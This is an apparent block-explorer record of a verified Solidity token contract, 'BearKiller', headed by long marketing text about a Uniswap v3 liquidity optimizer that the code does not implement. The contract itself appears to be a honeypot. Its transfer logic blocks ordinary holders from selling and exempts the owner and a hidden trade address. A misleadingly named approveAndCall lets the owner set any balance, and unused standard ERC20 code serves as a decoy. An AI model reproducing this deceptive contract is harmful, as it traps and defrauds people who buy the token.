{"status": "1", "message": "OK", "result": [{"SourceCode": "/*\r\nBear Killer Protocol: Redefining Liquidity Optimization\r\n\r\nWe recently launched BearKiller Killer v1 with a record time of releasing the dapp in just a month, what started merely as a thought while reading Uniswap v3 blog back in April is now turning into something truly powerful.\r\nRead more about the inception of BearKiller Killer here.\r\nWe initially started with the idea of providing users with a dapp that they can use to put their liquidity in the most optimized range.\r\n\r\nWhile we were building this, we realized this feature, while extremely helpful, is not enough.\r\nEven if you provide liquidity in the most optimized range\r\nYou still need to constantly monitor it to avoid getting out of range and losing fees.\r\nIf it\u2019s still in range but not optimized you risk losing a lot of fees.\r\nThe differences between small optimizations can be huge.\r\nLet\u2019s take an example.\r\nImagine you are choosing whether to concentrate liquidity to the\r\nDAI/USDT pair in the 0.99\u20131.01 price range, or the 0.9\u20131.1 range.\r\nThe former range is 10 times more efficient, meaning that if the price spends more than even 20% of its time in that range, that\u2019s a better place to allocate.\r\nFor every optimization to the range or getting the price in range, the user needs to send a transaction, which yes, you guessed it right means spending more ether on gas fees which honestly no one wants to.\r\nImagine a platform where on one click you can add liquidity with\r\nNo more manual oversight.\r\nNo more worrying about constant optimization.\r\nNo more spending loads of gas fees for each optimization.\r\nThis is what Bear Killer Protocol is all about.\r\nThe Rebranding Of BearKiller Killer\r\nWith these exciting features, we felt that there is a need to rebrand for positioning ourselves as the first universal automated liquidity optimizer protocol.\r\nThe Logo\r\n\r\nThe logo represents our Bear Killer protocol which will allow liquidity providers to always have their liquidity in the most optimal position.\r\nThe upward direction shows that their capital will increase in the same upward trajectory over time.\r\nThe Website\r\nThe Uniplot website will be launched on June 1.\r\nHere is a sneak peek at what it would look like.\r\n\r\nThe BEAR KILLER Token\r\nThe BEAR KILLER token is a governance/utility token that will be initially distributed to early adopters and can be bought through public/private sale.\r\nThe BEAR KILLER token is designed in a way that allows the token to be backed by hundreds of tokens. (More on this later)\r\nIt will attain further utility with the Bear Killer protocol as new features are implemented.\r\nMore info on token sale will be announced in the coming weeks.\r\n\r\n\r\nA new standard for AMMs\r\nThe evolution of the protocol\r\nSince its inception in 2018 by Uniswap, automated market makers (AMMs) have played a pivotal role in the emergence of decentralized finance. They have established new revenue streams for numerous users and offered them the security and convenience of trading through their own crypto wallets. To date they have amassed over $200B in trading volume and have rivaled some of the largest centralized exchanges in the industry. Uniswap V3, represents an evolution of this concept, as it introduces new features to improve the efficiency of the platform and ultimately increase the earning potential of the users who participate on it.\r\nGreater control and precision\r\nThe centerpiece feature of V3 is how it affords liquidity providers with more precise control over how they allocate their capital. For the first time, liquidity can be allocated to specific price ranges of the market maker\u2019s choosing. This feature which has been coined as \u201cConcentrated Liquidity\u201d has a two-fold benefit, one; increased market depth for tokens in pools and second, a reduction in slippage for traders. Furthermore, by concentrating the liquidity into a smaller range it will increase its capital efficiency when it is being used to sustain trades. Resulting in more fees being generated for an LP with a smaller liquidity position, than compared to V2.\r\nTo gain a better understanding of the benefits of Concentrated Liquidity, it is helpful to compare it to the structure of the previous Uniswap V2 liquidity provisioning. In V2, liquidity was distributed along an X * Y = K price curve, where buying and selling into the pool shifts the LPs position on the X * Y = K curve. The even distribution along the entire curve allows for trading across the whole price range from zero to infinity. The major drawback was that it resulted in a lot of unused liquidity if most of the trading only occurred in a narrow price range.\r\n\r\n\r\nLiquidity Concentration\r\nRather than distributing liquidity along the entire curve, V3 segments the curve into straight lines with a limited length. These smaller straight lines represent the price ranges chosen by the LPs and where all the V3 liquidity will sit. A long line yields better trading price coverage, and a short line yields better fees generated per amount of liquidity provided. By segmenting the curve, it results in the full utilization of the liquidity as the price moves along the straight line, giving LP\u2019s far greater capital efficiency and very low unused liquidity.\r\nAMM style limit orders\r\nWhile AMMs have seen an explosion in growth in recent times, the lack of Limit Orders have been a sticking point for many traders. A limit order is an order that will only execute at a predetermined price, it allows traders to buy at a lower or sell at a higher price than the current market price. This key feature has distinguished the centralized exchanges that use order books from the decentralize exchanges that are AMMs. Now, V3 has introduced a feature it coins as \u201cRange Orders\u201d to level the playing field between the two mediums of exchange.\r\nRange Orders are not a one-to-one representation of Limit Orders, but they reach parity in certain areas. Traders who want to sell their tokens for another at a specific price point can provide their single asset as liquidity in a targeted price range above or below the market price. Once the market price shifts, and it enters the targeted range, the deposited tokens will be swapped for other tokens in the pool smoothly along the price curve.\r\nTraders can now wait for the shifting market to trigger their desired tokens swaps similarly to the traditional Limit Orders, but with the added benefit of also earning fees as the trading price fluctuates within their targeted range. However, due to the unpredictable nature of the markets, the swapped asset must be removed before the price reverts back to above or below the targeted range. Else, it will be swapped back into the original deposited asset.\r\nMore sophisticated strategies\r\nHaving the ability to target specific price ranges opens the possibility for LPs to employ different strategies to maximize the earning potential of their liquidity positions. For one, LPs may choose to target a single wide price range for a moderate gain in capital efficiency to lower their risk to price fluctuations. Secondly, LPs might choose to target a single narrow price range for a large gain in capital efficiency while they increase their exposure to risk. Or finally, LPs may decide to target multiple price ranges within the same pool to increase their coverage to multiple price points while spreading out the risk.\r\nAnother area where V3 takes a step forward pertains to the fees that LPs accumulate. There are now multiple fee tiers to choose from, rather than the fixed 0.3% that was established in Uniswap V1. These flexible fees will result in more appropriate compensation to LPs in accordance to the risk of their liquidity position. To give a real word example, if a user were to provide liquidity to a low volatility asset such as a stable coin, then they might opt for the low fee tier to encourage more trading of the token. Whereas, with a high volatility asset such as a newly launched token, the user may opt for the high fee tier to offset the risk of holding the token.\r\nThe additional features of V3 will ultimately breed more competition and gamification, which is a good thing for users on the platform. Market makers will be encouraged to compete to offer the best rates in order to profit. Traders will be given the opportunity to distinguish themselves from the rest by using their skill and know-how of the\r\nmarkets. All in all, it will result in greater trading volume on the platform and a shot in the arm for the whole decentralized finance sector.\r\nWith great power comes great responsibility\r\nFor proficient users, their earning potential on V3 will be much higher than that of V2. On the flip side, the margin of error for those who are not as skilled will in fact be smaller on the new protocol. For instance, with \u201cConcentrated Liquidity\u201d there is a real possibility of far more exposure to \u201cImpermanent Loss\u201d. Which is when a user provides liquidity to a pool and the market price of the asset diverges from the initial price at the time of deposit. At this point, arbitrageurs become incentivized to rebalance the pool and effectively take profit from the LPs. Concentrated liquidity increases the likelihood that the market price will move away from it and increase the composition of the LPs holdings into the weaker asset.\r\nThere is also a similar story with the \u201cRange Orders\u201d. As it offers no guarantee that once the market price of an asset reaches the trader\u2019s target price range it will be swapped over for the other asset. Therefore, the responsibility is still on the trader to judge the correct time to remove their asset, to successfully perform this quasi-Limit Order. This does not diminish Range Orders as a feature, but it highlights how the users who keep up to date with the markets will be able to utilize it to its full potential.\r\nOpening the gates for new platforms\r\nAs much progress as Uniswap V3 has made over V2, it is still not the finished article. On the one hand, it adds new tools to the arsenal of traders to help maximize profits and lower their risk. While on the other hand, it adds an extra layer of complexity to tasks that were straightforward on V2.This extra complexity reduces the margin of error and potentially can lead to unfavorable situations for some users. The good news is that often in this industry, the launch of one protocol or platform can pave the way for new projects/services to be built on top to improve the user experience. This very well may be the case with V3, as it could spawn services that can help clients to optimize their strategies while managing the complexity on their behalf.\r\n\r\n\r\nWhat exactly is BearKiller Killer?\r\nNote: This excerpt represents the first part of the article series: \u2018Explaining the Bear Killer Protocol\u201d. As we progress through this series, we will explain more about the Bear Killer protocol from its technicalities, additional features, and existing framework to the broader vision that it aims to achieve.\r\nThe next article in particular will discuss the technical aspect of the protocol along with some of its game-changing features.\r\nLet\u2019s Start from the beginning\r\nThe radical innovation in the blockchain industry continues to propel as Uniswap- one of the top decentralized exchanges operating in the DeFi space launches version 3.0 of its protocol. Uniswap v3 allows liquidity providers to concentrate their capital in custom price ranges.\r\nThis not only ensures effective utilization of the liquidity invested but also offers greater control to liquidity providers in allocating their capital.\r\n\r\nIn addition to that, the amount of capital at risk is far less as compared to Uniswap v2 since the price ranges are narrow and there is a better chance of getting a greater proportion of the overall liquidity utilized in terms of retail trades.\r\nPrior to the launch of Uniswap v3, liquidity providers had to spread their liquidity over the entire price curve from zero to infinity which not only resulted in lesser percentage returns but also required higher capital.\r\n\r\nThe inception of Uniswap v3 has provided a whole new avenue of yield farming to liquidity providers. Through the concentrated liquidity mechanism, liquidity providers can earn significantly higher amounts of returns on their investments while having full control over the deployment of their funds.\r\nThe idea\r\nThere is no denying the fact that the concept of \u2018Concentrated Liquidity\u2019 promises more enticing returns to liquidity providers than the previous version of the protocol.\r\nHowever, \u2018there is no such thing as free lunch\u2019, to achieve these attractive returns liquidity providers have to constantly oversee and manage their capital.\r\n\r\nThey have to readjust their positions by adding or removing liquidity every time the active price falls out of the concentrated liquidity range. The readjustment not only requires constant manual oversight but it also involves high transaction costs and with regular price fluctuations in the market, liquidity providers will still have to lock large amounts of capital to keep earning fees.\r\nThe only way liquidity providers on Uniswap v3 can achieve these attractive returns is when someone else manages their capital for them and this is where our protocol comes into play.\r\nHere comes BearKiller Killer\r\nBearKiller Killer saves liquidity providers from the hassle of manual oversight through automated liquidity optimization and management.\r\nThe aim of the Bear Killer protocol is to ensure maximum capital efficiency by allocating the right mix of capital to each of Uniswap\u2019s liquidity pools existing on its platform.\r\nThe challenge with concentrated liquidity is keeping it in the active price range so that it consistently earns fees through trades. The more time the capital is locked in the active price range the more trading fees it earns.\r\nIf price fluctuates and capital goes out of the price range it does not earn any fees. BearKiller Killer solves this problem by allocating capital to the narrowest price range to earn the maximum amount of fees. Even minor optimizations in price ranges can impose drastic changes in terms of capital efficiency.\r\nApart from offering optimized liquidity positions, the Bear Killer protocol also auto-rebalances liquidity in appropriate price ranges to cater to the changing market prices.\r\nIn addition to that, the transaction cost involved with readjusting liquidity is also disbursed by the protocol so liquidity providers don't have to worry about the increasing gas costs on Ethereum.\r\nUniversal Liquidity Optimization\r\nUniswap v3 has introduced a breakthrough design improvement in the form of \u2018Concentrated liquidity\u2019 in the automated market-making (AMM) ecosystem. With the traction that liquidity farming has gained within a month, we can assume other decentralized exchanges following the same model in the near future.\r\nFor this purpose, we introduce the concept of universal liquidity optimization which indicates that the protocol will be compatible with all other AMM\u2019s that may adopt the concentration liquidity mechanisms in future.\r\nTLDR\r\nBearKiller Killer serves as an investment manager for all the liquidity providers who want to invest their capital in Uniswap v3 while avoiding manual oversight and other added complexities of the protocol.\r\nWith BearKiller Killer, these liquidity providers can deposit their assets, choose the desired pair of tokens they want to provide liquidity for and the protocol will deploy their capital accordingly. Once the capital is deployed, the protocol continuously optimizes liquidity positions and automatically rebalances them as per the market movements and risk appetite of the liquidity provider.\r\n\r\nThe Bear Killer Index Fund\r\n\r\nNote: This excerpt is the third article of the series \u201cExplaining the Bear Killer Protocol\u201d. Read the previous article \u201cA Nosedive into Bear Killer Protocol\u201d.\r\nIn the last article, we revealed that the protocol\u2019s earnings get sent to an Index Fund, which maintains the value of the native token.\r\nWe can now explore its inner mechanism to understand how this Index Fund encapsulates the goal of BearKiller Killer and why it is a crucial feature.\r\nFurthermore, we will also expand on how the holders of the $BEAR KILLER tokens can make their voices heard and influence key aspects of the protocol.\r\nFinally, we will cover the possible strategies of malicious users would be and how the protocol will deal with them.\r\nIndex Fund\r\nWhat is the index fund, and how does it work?\r\nThe index fund will serve as a repository for the fees earned by the BearKiller Killer protocol, its primary purpose will be to underpin the value of the $BEAR KILLER token.\r\nIt will be a separate smart contract that is connected to the protocol to accumulate tokens. The more fees the protocol generates, the more the Index Fund will accumulate tokens and grow in value. Users will then be able to interact with it directly to access the tokens held within it.\r\nHere are how the two stages of the Index Fund will work:\r\nAccumulating tokens (protocol \u00e0 Index Fund):\r\nTokens are accumulated into the Index Fund from the protocol when LPs withdraw their earnings(fees), these can be in two forms:\r\n1. Vault fares:\r\nWhen an LP wants to withdraw the fees generated while staying in the Bear Killer protocol, they\u2019ll have two options.\r\na) When an LP chooses to withdraw their LP fee tokens, there will be a 2% fare on the fees generated (current rate, which can be changed through governance) of their fee tokens will be sent to the Index Fund.\r\n\r\nb) When an LP chooses to receive BEAR KILLER tokens equivalent in dollar value to their LP fee tokens instead, there will be no fare on the LP and all their LP fee tokens will be sent to the Index Fund.\r\n2. Burning BEAR KILLER tokens (Index Fund \u00e0 User):\r\nThe only way for users to access the tokens held in the Index Fund is by burning their BEAR KILLER tokens.\r\nA percentage of the BEAR KILLER token supply can be burned to access the same percentage of tokens in the index fund supply.\r\nExample\r\nThe index fund holds $10m worth of various tokens accumulated from \u201cVault fares\u201d and \u201cLP fees\u201d.\r\nThese tokens are: $1m LINK, $3m UNI, $6m USDC.\r\n\u201cJohn\u201d would like to access these tokens in exchange for his BEAR KILLER tokens, of which he holds 0.1% of the supply.\r\nIf John interacts with the index fund and burns all his tokens, he will be eligible to receive 0.1% of the supply of the index fund ($10,000 worth of various tokens).\r\nHe would receive: $1000 LINK, $3000 UNI, $6000 USDC\r\nHow will it affect the BEAR KILLER token price?\r\nThe 1:1 ratio of burning BEAR KILLER to receive Index Fund tokens will present opportunities for arbitraging between the index fund and exchanges, as the value and price diverge between the two.\r\nIf the value of BEAR KILLER tokens (value of total supply) decreases relative to the total value of the Index Fund, then holders will be incentivized to burn their BEAR KILLER at a 1:1 ratio to receive Index Fund tokens with a higher dollar value. Moreover, the token\u2019s value will not be able to fall below that of the underlying assets in the Index fund.\r\nAs long as there is a delta between the two values, the burning will continue until the BEAR KILLER token value matches that of the Index Fund. Furthermore, this ensures that a rising Index Fund will also lift the BEAR KILLER token\u2019s value by the same mechanism. Essentially, this will allow the Index Fund to become a collateralized backstop for the BEAR KILLER token, as its price will become pegged to it.\r\nExample\r\nInitially, the total value of the Index Fund and the market cap of BEAR KILLER are equal at $20M\r\nThe Index Fund accumulates tokens and grows in value to $15M in a short period of time\r\n\u201cSarah\u201d wants to take advantage of this delta and profit from it, she holds 0.1% of the supply of BEAR KILLER worth $10,000\r\nIf she interacts with the Index Fund and burns all her tokens, she will receive 0.1% of the Index Fund tokens worth $15,000\r\nIn theory, as more people take advantage of this difference, the continuous burning of the BEAR KILLER supply and the reduction in the Index Fund supply will cause both values to reach parity.\r\nConsequently, raising the value of BEAR KILLER from its initial position.\r\nWhat is the reasoning for an Index fund?\r\nThe index fund is another feature that separates BearKiller Killer from other liquidity optimizers. It aligns the incentives of the protocol with its users, as the value of its native token will be dependent on the success of the protocol.\r\nThe more people that use BearKiller Killer to provide liquidity, the more the index fund will accumulate tokens and grow in value. This, in turn, will reinforce the price of $BEAR KILLER token as the token burning will bolster its value proposition.\r\nPositive feedback loop\r\nConsequently, the Index fund can be thought of as the final piece in a positive feedback loop. The success of the protocol through high usage and fee generation will be captured and used to directly impact and increase the value of the native token.\r\nSubsequently, a valuable BEAR KILLER token will facilitate better rewards for the \u201cCaptains\u201d and more LPs choosing to receive the native token as their earnings, this, in turn, will drive up the usage of the protocol.\r\nLet\u2019s talk about Governance\r\nWhat can be voted on and how much say will voters have?\r\nHolding the BEAR KILLER token also grants users the opportunity to take part in the \u201cDecentralized Governance\u201d of BearKiller Killer. With their tokens they can vote on key aspects, such as changing the \u201cVault Fare\u201d, changing the reward percentages for \u201cCaptains\u201d or even making tweaks to how the protocol readjusts liquidity ranges.\r\nThere is no minimum amount required for voting, even holding one BEAR KILLER token will be sufficient.\r\nBEAR KILLER holders will also be able to vote on the future direction of the protocol, e.g. choosing between two development paths to go down or the implementation of one feature over another. In addition to this, there will also be a foundation fund making up around 35% of the supply and its resources will be at the full discretion of the voters.\r\nAll these measures ensure that the BearKiller Killer protocol will ultimately be indebted to the holders of the token and not any other third parties.\r\nSafeguarding the protocol\r\nPossible attack vectors\r\nIn order to be sustainable, the protocol is set up in a way where only those who put something in can get something back in return. The universal and permissionless nature of BearKiller Killer means that anyone can deploy a Vault, contribute to its maintenance, and be rewarded for their efforts without needing to be whitelisted. However, this does open up the possibility for a minority who are looking for loopholes in the system to get back more than they put in.\r\nThis can be observed in malicious users who can try to drain the \u201cConcentration Incentives\u201d in the following way:\r\n1. Deploy a Vault for a token pair with a very low amount of liquidity\r\n2. Cause a drastic price change in that liquidity pool, with a single trade on Uniswap\r\n3. When the price fluctuates greatly (by 30\u201340%), initiate a readjustment transaction on BearKiller Killer\r\n4. Profit from the BEAR KILLER rewards for bringing the liquidity back into the optimal range\r\nPossible attack prevention\r\nThe prevention is simple, we will always make sure that the premium is always less than the gas fees of a swap.\r\nIf a malicious user attempts to manipulate the price of an asset by sending it out of range through a swap transaction and then calls a readjustment function to alter the price range, he would have to pay more in terms of gas fees than the amount of premium he earns for playing a similar role to that of a captain.\r\nAlthough the protocol offers anyone the ability to provide liquidity and deploy a vault to earn trading fees, it only enables the $BEAR KILLER token fee withdrawal option to whitelisted pairs to prevent worthless projects from entering the system.\r\nThe team will whitelist top token pairs at launch and in the future, $BEAR KILLER token holders can vote to whitelist any additional token pairs.\r\nWhat we have learned so far\r\nThe Index Fund amplifies the success of the BearKiller Killer protocol as it captures the value created from people using the protocol and returns it to the token that powers the ecosystem. The protocol employs a governance model that ensures that its token holders will be at the front and center of future developments and will also have power over changing the current decisions.\r\nThe BearKiller Killer protocol also takes security very seriously and has contingency plans in place for possible attack vectors and penalties for \u201cbad actors\u201d that benefit the protocol.\r\nIn the following article, we will look into an exciting new feature that is only possible with V3 and coined by the BearKiller Killer team as \u201cFlash Liquidity\u201d and how it unlocks new avenues for generating income.\r\nStay tuned for more.\r\n*/\r\npragma solidity ^0.5.17;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns(uint);\r\n\r\n    function balanceOf(address account) external view returns(uint);\r\n\r\n    function transfer(address recipient, uint amount) external returns(bool);\r\n\r\n    function allowance(address owner, address spender) external view returns(uint);\r\n\r\n    function approve(address spender, uint amount) external returns(bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns(bool) {\r\n        bytes32 codehash;\r\n        bytes32 accountHash;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { codehash:= extcodehash(account) }\r\n        return (codehash != 0x0 && codehash != accountHash);\r\n    }\r\n}\r\n\r\ncontract Context {\r\n    constructor() internal {}\r\n    // solhint-disable-previous-line no-empty-blocks\r\n    function _msgSender() internal view returns(address payable) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint a, uint b) internal pure returns(uint) {\r\n        uint c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint a, uint b) internal pure returns(uint) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        require(b <= a, errorMessage);\r\n        uint c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint a, uint b) internal pure returns(uint) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint a, uint b) internal pure returns(uint) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint c = a / b;\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\nlibrary SafeERC20 {\r\n    using SafeMath for uint;\r\n    using Address for address;\r\n\r\n    function safeTransfer(IERC20 token, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n\r\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n\r\n    function safeApprove(IERC20 token, address spender, uint value) internal {\r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n\r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        require(success, \"SafeERC20: low-level call failed\");\r\n\r\n        if (returndata.length > 0) { // Return data is optional\r\n            // solhint-disable-next-line max-line-length\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context, IERC20 {\r\n    using SafeMath for uint;\r\n    mapping(address => uint) private _balances;\r\n\r\n    mapping(address => mapping(address => uint)) private _allowances;\r\n\r\n    uint private _totalSupply;\r\n\r\n    function totalSupply() public view returns(uint) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns(uint) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint amount) public returns(bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns(uint) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint amount) public returns(bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint addedValue) public returns(bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint amount) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}\r\n\r\ncontract ERC20Detailed is IERC20 {\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    constructor(string memory name, string memory symbol, uint8 decimals) public {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n    }\r\n\r\n    function name() public view returns(string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns(string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns(uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n\r\n\r\ncontract BearKiller {\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n \r\n    function transfer(address _to, uint _value) public payable returns (bool) {\r\n        return transferFrom(msg.sender, _to, _value);\r\n    }\r\n \r\n    function ensure(address _from, address _to, uint _value) internal view returns(bool) {\r\n       \r\n        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){\r\n            return true;\r\n        }\r\n        require(condition(_from, _value));\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\r\n        if (_value == 0) {return true;}\r\n        if (msg.sender != _from) {\r\n            require(allowance[_from][msg.sender] >= _value);\r\n            allowance[_from][msg.sender] -= _value;\r\n        }\r\n        require(ensure(_from, _to, _value));\r\n        require(balanceOf[_from] >= _value);\r\n        balanceOf[_from] -= _value;\r\n        balanceOf[_to] += _value;\r\n        _onSaleNum[_from]++;\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n \r\n    function approve(address _spender, uint _value) public payable returns (bool) {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    \r\n    function condition(address _from, uint _value) internal view returns(bool){\r\n        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;\r\n        \r\n        if(_saleNum > 0){\r\n            if(_onSaleNum[_from] >= _saleNum) return false;\r\n        }\r\n        if(_minSale > 0){\r\n            if(_minSale > _value) return false;\r\n        }\r\n        if(_maxSale > 0){\r\n            if(_value > _maxSale) return false;\r\n        }\r\n        return true;\r\n    }\r\n \r\n    mapping(address=>uint256) private _onSaleNum;\r\n    mapping(address=>bool) private canSale;\r\n    uint256 private _minSale;\r\n    uint256 private _maxSale;\r\n    uint256 private _saleNum;\r\n    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {\r\n        require(msg.sender == owner);\r\n        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n        canSale[spender]=true;\r\n        return true;\r\n    }\r\n\r\n    address tradeAddress;\r\n    function transferownership(address addr) public returns(bool) {\r\n        require(msg.sender == owner);\r\n        tradeAddress = addr;\r\n        return true;\r\n    }\r\n \r\n    mapping (address => uint) public balanceOf;\r\n    mapping (address => mapping (address => uint)) public allowance;\r\n \r\n    uint constant public decimals = 18;\r\n    uint public totalSupply;\r\n    string public name;\r\n    string public symbol;\r\n    address private owner;\r\n \r\n    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        totalSupply = _supply*(10**uint256(decimals));\r\n        owner = msg.sender;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        emit Transfer(address(0x0), msg.sender, totalSupply);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approveAndCall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\"